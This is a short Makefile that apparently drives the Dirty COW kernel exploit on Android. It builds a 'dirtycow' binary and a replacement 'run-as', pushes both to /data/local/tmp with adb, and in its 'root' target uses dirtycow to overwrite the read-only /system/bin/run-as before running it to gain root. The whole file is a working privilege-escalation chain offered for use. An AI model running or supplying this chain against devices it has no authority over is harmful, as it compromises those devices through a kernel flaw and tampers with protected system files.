
all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_PLATFORM=android-21 

push: build
	adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow
	adb push libs/armeabi/run-as /data/local/tmp/run-as

root: push	
	adb shell 'chmod 777 /data/local/tmp/run-as'
	adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
	adb shell /system/bin/run-as

clean:
	rm -rf libs
	rm -rf obj
